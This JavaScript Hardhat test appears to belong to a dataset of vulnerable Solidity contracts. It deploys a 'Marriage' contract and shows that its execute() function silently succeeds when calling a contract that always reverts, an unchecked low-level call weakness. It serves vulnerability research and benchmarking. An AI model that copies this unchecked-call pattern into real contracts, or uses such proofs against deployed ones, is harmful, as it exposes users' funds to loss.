const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol", function () {

  let onwer;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const Marriage = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol:Marriage");
    const contract = await Marriage.connect(owner).deploy(owner.address);

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(contract.connect(owner).execute(revertContract.target, 0, "0x")).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(0);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

  });
});
